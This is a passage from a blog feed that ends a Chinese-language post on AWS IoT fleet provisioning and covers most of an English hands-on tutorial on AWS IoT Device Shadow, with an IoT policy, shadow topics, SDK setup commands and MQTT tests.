class="string">&quot;221a6d10-9c7f-42f1-9153-e52e6fc869c1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;parameters&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;string&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>向 AWS IoT 註冊裝置時，AWS IoT 會將此物件傳送至 Lambda 函數。</p><p>傳遞給 Lambda 函數的 <code>parameters</code> 物件包含在 <strong>RegisterThing</strong> 請求 Payload中傳遞之 parameters 引數中的屬性</p><h2 id="設置-設備端"><a href="#設置-設備端" class="headerlink" title="設置 - 設備端"></a>設置 - 設備端</h2><p>所下載的 Claim 憑證和私鑰會需要移動到設備端</p><p>可以通過像是 <code>scp</code> 之類的命令來去透過 SSH 將本地複製檔案到您的設備中。</p><p>另外，會需要在設備端去安裝想要使用的 <strong>IoT Device SDK</strong></p><blockquote><p>AWS IoT 裝置 SDK、行動 SDK 和 AWS IoT 裝置用戶端 - <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-sdks.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-sdks.html</a></p></blockquote><p>目前有支援以 C++, javascript, Java, Python, Embedded-C 語言撰寫的 Device SDK，可以根據實際需求和情境進行使用。</p><h3 id="使用-AWS-IoT-Device-SDK"><a href="#使用-AWS-IoT-Device-SDK" class="headerlink" title="使用 AWS IoT Device SDK"></a>使用 AWS IoT Device SDK</h3><blockquote><p><a href="https://github.com/aws/aws-iot-device-sdk-python-v2">https://github.com/aws/aws-iot-device-sdk-python-v2</a></p></blockquote><p>本篇文章主要使用 <strong>Python IoT Device SDKv2</strong></p><p>若要安裝 SDK 到設備，請先確認設備上是否有 <code>git</code> , <code>Python3</code>還有 <code>Python3-pip</code>套件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aws/aws-iot-device-sdk-python-v2.git</span><br></pre></td></tr></table></figure><p>初始化套件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#  (Optional) Setup the version number of your local build. The default version </span><br><span class="line">#    for awsiotsdk is set to &quot;1.0.0-dev&quot;, you can set the version number of the</span><br><span class="line">#    local build in &quot;aws-iot-device-sdk-python-v2/awsiot/__init__.py&quot;</span><br><span class="line">sed -i &quot;s/__version__ = &#x27;1.0.0-dev&#x27;/__version__ = &#x27;&lt;SDK_VERSION&gt;&#x27;/&quot; \</span><br><span class="line">  aws-iot-device-sdk-python-v2/awsiot/__init__.py</span><br><span class="line"></span><br><span class="line">#  Install using Pip (use &#x27;python&#x27; instead of &#x27;python3&#x27; on Windows)</span><br><span class="line">python3 -m pip install ./aws-iot-device-sdk-python-v2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 <code>aws-iot-device-sdk-python-v2/samples/fleetprovisioning.py</code> 你也可以通過教本來去設置 Provisioning Template。</p><p>而後續您需要在您的設備上指定：</p><ul><li>AWS IoT Endpoint</li><li>Claim Certificate</li><li>Private Key<br>來去連接到 AWS IoT Core</li></ul><p>腳本的操作步驟可以在下面找到</p><blockquote><p><a href="https://github.com/aws/aws-iot-device-sdk-python-v2/blob/main/samples/fleetprovisioning.md">https://github.com/aws/aws-iot-device-sdk-python-v2/blob/main/samples/fleetprovisioning.md</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fleetprovisioning.py --endpoint &lt;endpoint&gt; --cert &lt;file&gt; --key &lt;file&gt; --template_name &lt;name&gt; --template_parameters &#x27;&#123;\&quot;SerialNumber\&quot;:\&quot;1\&quot;,\&quot;DeviceLocation\&quot;:\&quot;Seattle\&quot;&#125;&#x27; --csr &lt;path to csr file&gt;</span><br></pre></td></tr></table></figure><h2 id="參考文件"><a href="#參考文件" class="headerlink" title="參考文件"></a>參考文件</h2><p>[+] <a href="https://github.com/aws-samples/aws-iot-fleet-provisioning">https://github.com/aws-samples/aws-iot-fleet-provisioning</a><br>[+] <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-provision.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/iot-provision.html</a><br>[+] <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-wo-cert.html#claim-based">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-wo-cert.html#claim-based</a><br>[+] <a href="https://aws.amazon.com/tw/blogs/iot/how-to-automate-onboarding-of-iot-devices-to-aws-iot-core-at-scale-with-fleet-provisioning/">https://aws.amazon.com/tw/blogs/iot/how-to-automate-onboarding-of-iot-devices-to-aws-iot-core-at-scale-with-fleet-provisioning/</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT Core </tag>
            
            <tag> Certificate </tag>
            
            <tag> Device Provisioning </tag>
            
            <tag> Policy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: AWS IoT Device Shadow</title>
      <link href="/posts/aws-iot-device-shadow.html"/>
      <url>/posts/aws-iot-device-shadow.html</url>
      
        <content type="html"><![CDATA[<h1 id="Intro-What-is-AWS-IoT-Device-Shadow"><a href="#Intro-What-is-AWS-IoT-Device-Shadow" class="headerlink" title="Intro - What is AWS IoT Device Shadow?"></a>Intro - What is AWS IoT Device Shadow?</h1><p>In real world, sometime it is difficult to get the actual device state in real time in such IoT scenarios.</p><p>A device shadow can overcome this challenge, Device Shadow can consider a virtual  virtual representation of a device which managed by the <strong>IoT Things</strong> resource created in AWS IoT Core.</p><blockquote><p>The Shadow document is a JSON or a JavaScript notation doc that is used to store and retrieve the current state information for a device. You can use the shadow to get and set the state of a device over MQTT topics or HTTP REST APIs, regardless of whether the device is connected to the internet.</p></blockquote><h1 id="Shadow-Document"><a href="#Shadow-Document" class="headerlink" title="Shadow Document"></a>Shadow Document</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;green&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;delta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;green&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">   <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Refer to the json above, you can check there 3 <strong>state</strong> properties in shadow document.</p><ul><li>desired<ul><li>Apps specify the desired states of device properties by updating the desired object</li></ul></li><li>reported<ul><li>Devices report their current state in the reported object.</li></ul></li><li>delta<ul><li>AWS IoT reports differences between the desired and the reported state in the delta object.</li></ul></li></ul><blockquote><p>You can consider the flow of Shadow a finite state machine, for AWS IoT Core, it will also check if there are delta event, that means there difference between <strong>Desired</strong> and <strong>Reported</strong> states</p></blockquote><p>So how can we update the state of a shadow?  The answer is clear,</p><blockquote><p><strong>By subscribing&#x2F;publishing messages to the certain MQTT topics</strong></p></blockquote><h1 id="Shadow-Topic"><a href="#Shadow-Topic" class="headerlink" title="Shadow Topic"></a>Shadow Topic</h1><table><thead><tr><th>ShadowTopicPrefix value</th><th>Shadow type</th></tr></thead><tbody><tr><td>$aws&#x2F;things&#x2F;<code>thingName</code>&#x2F;shadow</td><td>Unnamed (classic) shadow</td></tr><tr><td>$aws&#x2F;things&#x2F;<code>thingName</code>&#x2F;shadow&#x2F;name&#x2F;shadowName</td><td>Named shadow</td></tr></tbody></table><table><thead><tr><th>Topic</th><th>Client operations allowed</th></tr></thead><tbody><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete&#x2F;accepted</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;delete&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get&#x2F;accepted</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;get&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update</td><td>Publish&#x2F;Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;accepted</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;rejected</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;delta</td><td>Subscribe</td></tr><tr><td><code>ShadowTopicPrefix</code>&#x2F;update&#x2F;documents</td><td>Subscribe</td></tr></tbody></table><blockquote><p>For detail explanation about these shadow topics, see the documentation - <a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/device-shadow-mqtt.html">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/device-shadow-mqtt.html</a></p></blockquote><h1 id="The-state-changes-of-Device-Shadow"><a href="#The-state-changes-of-Device-Shadow" class="headerlink" title="The state changes of Device Shadow"></a>The state changes of Device Shadow</h1><p><img src="https://i.imgur.com/l071JEc.png" alt="Imgur"></p><p>Take this picture for example, the update flow is:</p><ol><li>The MQTT client publishes a <code>$aws/things/myLightBulb/shadow/update</code> message to the server. The message carries the desired state <code>&#123;&quot;state&quot;: &#123;&quot;desired&quot;:&#123;&quot;color&quot;:&quot;green&quot;&#125;&#125;&#125;</code></li><li>IoT Server responds with <code>$aws/things/myLightBulb/shadow/accepted</code>, indicating that the update message has been received. At the same time, it publishes <code>$aws/things/myLightBulb/shadow/delta</code> to notify the device to update, and then publishes <code>$aws/things/myLightBulb/shadow/update/document</code> as update record</li><li>After receiving the message, the Device performs the corresponding update operation and publishes a message <code>$aws/things/myLightBulb/shadow/update</code> <code>&#123;&quot;state&quot;&#123;&quot;report&quot;:&#123;&quot;color&quot;:&quot;green&quot;&#125;&#125;&#125;</code> to the IoT Server after completion. Notification updated</li><li>After receiving the post-update message, IoT Server responds with <code>$aws/things/myLightBulb/shadow/accepted</code> to indicate that the update message has been received. Publish another <code>$aws/things/myLightBulb/shadow/update/document</code> as an update record</li></ol><h1 id="Expermient-for-IoT-Shadow"><a href="#Expermient-for-IoT-Shadow" class="headerlink" title="Expermient for IoT Shadow"></a>Expermient for IoT Shadow</h1><h2 id="Device-Setup"><a href="#Device-Setup" class="headerlink" title="Device Setup"></a>Device Setup</h2><p>Since I don’t have any IoT Device currently available, I simulate the device by launching a EC2 instance.</p><ul><li>AMI: <code>Ubuntu 22 LTS</code></li><li>Type: <code>t2.Micro</code></li><li>Subnet: <code>10.1.0.0/24</code></li></ul><p>Then connect to the EC2 instance by using SSH, and run the following command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y python3-pip</span><br><span class="line">mkdir certs/</span><br></pre></td></tr></table></figure><h2 id="Setup-in-AWS-IoT-Core"><a href="#Setup-in-AWS-IoT-Core" class="headerlink" title="Setup in AWS IoT Core"></a>Setup in AWS IoT Core</h2><p>There are 3 things to setup in AWS IoT Core</p><ul><li>Create certificate</li><li>Create IoT Policy and associated with the certificate</li><li>Create Things object and associate with the certificate</li></ul><h3 id="Things"><a href="#Things" class="headerlink" title="Things"></a>Things</h3><p>This is a thing named <code>ESP32</code> for testing purposes, it have associated with the certificate</p><p><img src="https://i.imgur.com/96y4cVz.png" alt="Imgur"></p><h3 id="Certificate"><a href="#Certificate" class="headerlink" title="Certificate"></a>Certificate</h3><p>And this certificate has issued by the Amazon Root CA.</p><p><img src="https://i.imgur.com/Hg9Jzsv.png" alt="Imgur"></p><p>And there are IoT Policy - <code>TestPolicy</code> asccociate with this certificate.</p><p><em>TestPolicy</em></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Receive&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/get/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topic/$aws/things/THING_NAME/shadow/update/delta&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Subscribe&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/get/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:rus-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/get/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/accepted&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/rejected&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:iot:us-east-1:AWS_ACCOUNT:topicfilter/$aws/things/THING_NAME/shadow/update/delta&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Connect&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Remember, this policy must have adequate permissions for <code>CONNECT</code>, <code>SUBSCRIBE</code>, <code>Publish</code> and <code>Publish</code><br>to the Shadow topic.</p><p>Once you have setup these stuff, now I need to convey the certificate to the EC2 instance.</p><p><img src="https://i.imgur.com/LKSyMJw.png" alt="Imgur"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -i &lt;SSH KEY&gt; TestDeviceShadow/*    ubuntu@ec2-&lt;EC2 Public Address&gt;.compute-1.amazonaws.com:/home/ubuntu/certs</span><br></pre></td></tr></table></figure><p>Apart from the device certificate, it is necessary to provide the CA certificate in the device.</p><ul><li>Download the CA Cert in the device</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd certs/</span><br><span class="line">curl -o ~/certs/Amazon-root-CA-1.pem \</span><br><span class="line">    https://www.amazontrust.com/repository/AmazonRootCA1.pem </span><br></pre></td></tr></table></figure><p>Now there all credential we need to test the IoT Device Shadows</p><h2 id="Install-the-IoT-Core-Python-Device-SDK"><a href="#Install-the-IoT-Core-Python-Device-SDK" class="headerlink" title="Install the IoT Core Python Device SDK"></a>Install the IoT Core Python Device SDK</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aws/aws-iot-device-sdk-python-v2.git</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s/__version__ = &#x27;1.0.0-dev&#x27;/__version__ = &#x27;&lt;SDK_VERSION&gt;&#x27;/&quot; \</span><br><span class="line">  aws-iot-device-sdk-python-v2/awsiot/__init__.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install ./aws-iot-device-sdk-python-v2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/aws-iot-device-sdk-python-v2/samples</span><br></pre></td></tr></table></figure><h2 id="Execute-the-shadow-py"><a href="#Execute-the-shadow-py" class="headerlink" title="Execute the shadow.py"></a>Execute the shadow.py</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shadow.py --ca_file ~/certs/Amazon-root-CA-1.pem --cert ~/certs/device.pem.crt --key ~/certs/private.pem.key --endpoint your-iot-endpoint --thing_name your-iot-thing-name</span><br></pre></td></tr></table></figure><blockquote><p>You can derive the iot endpoint by checking the AWS IoT Console<br>Find the <strong>Connect</strong> &gt; <strong>Connect One Device</strong> in the left pane<br>Scroll down and you will see the IoT endpoint</p></blockquote><p><img src="https://i.imgur.com/mDBpV7l.png" alt="Imgur"></p><p>Back to the script, after you execute the <code>shadow.py</code>, you will see the prompt in your terminal</p><p><img src="https://i.imgur.com/necUKaZ.png" alt="Imgur"></p><p>You will need to enter the desired value. So I enter “yellow”.</p><p><img src="https://i.imgur.com/CQOkk83.png" alt="Imgur"></p><p>Then you can observe that the state changed to “yellow”. This results may also observe from the AWS IoT Console</p><blockquote><p>Go to Things, and select your thing object, on the bottem of the target thing page, you can navigate to the <strong>Device Shadow</strong> tab, then select the <strong>Classic Shadow</strong>, then you can see the Device Shadow State below</p></blockquote><p><img src="https://i.imgur.com/KTfooA1.png" alt="Imgur"></p><p><img src="https://i.imgur.com/Xcu4BKk.png" alt="Imgur"></p><p>For testing, I enter “green” as the input of <code>shadow.py</code>.</p><p>And the state change show in both terminal and IoT Console</p><p><img src="https://i.imgur.com/AEEMMCa.png" alt="Imgur"></p><p><img src="https://i.imgur.com/BWi4UZh.png" alt="Imgur"></p><h2 id="Test-the-Shadow-Document"><a href="#Test-the-Shadow-Document" class="headerlink" title="Test the Shadow Document"></a>Test the Shadow Document</h2><p>Now you can try to edit the Shadow Document directly.</p><p>For example, I change the desired state from red to green.</p><p>Then you will notice that the change will reflect to the <strong>Delta report</strong>.</p><p><img src="https://i.imgur.com/9l40PXT.png" alt="Imgur"></p><h2 id="Test-with-AWS-IoT-Test-MQTT-Client"><a href="#Test-with-AWS-IoT-Test-MQTT-Client" class="headerlink" title="Test with AWS IoT Test MQTT Client"></a>Test with AWS IoT Test MQTT Client</h2><p>First, it is necessary to subscribe to the shadow topic in the MQTT client, for receiving the state change events.</p><p><img src="https://i.imgur.com/Zq4x4i8.png" alt="Imgur"></p><p>The client can subscribe to the topic</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$aws/things/ESP32/shadow/update/#</span><br></pre></td></tr></table></figure><p>The wildcard symbol <strong>“#”</strong> indicates that it wants to subscribe all topic under the <code>update/</code> prefix.</p><p>And you can re-run the program with new color value. You can find the MQTT client will receive the state change events.</p><p>At first, the color was “red”.</p><blockquote><p>The message published to $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;document topic</p></blockquote><p>Then it changed to “green”.</p><blockquote><p> The message published to $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;accepted topic<br>Noted that any unsuccessful messages were received on the topic $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;rejected </p></blockquote><p><img src="https://i.imgur.com/brQ3knq.png" alt="Imgur"></p><h2 id="Edit-the-shadow-document-again"><a href="#Edit-the-shadow-document-again" class="headerlink" title="Edit the shadow document again"></a>Edit the shadow document again</h2><p>I change the desired stat value “blue” to “black”.</p><p><img src="https://i.imgur.com/DVKi6Xb.png" alt="Imgur"></p><p>The first received event will be on the delta topic, it means that there are differences between desired state and reported state.</p><p>At the same time, the message will published to the topic $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;accepted for notifying the device to update the state</p><p><img src="https://i.imgur.com/7fewMie.png" alt="Imgur"></p><p>And also published to the shadow document topic for recording.</p><p><img src="https://i.imgur.com/FYULN43.png" alt="Imgur"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;previous&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699430576</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699430576</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">20</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;current&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> 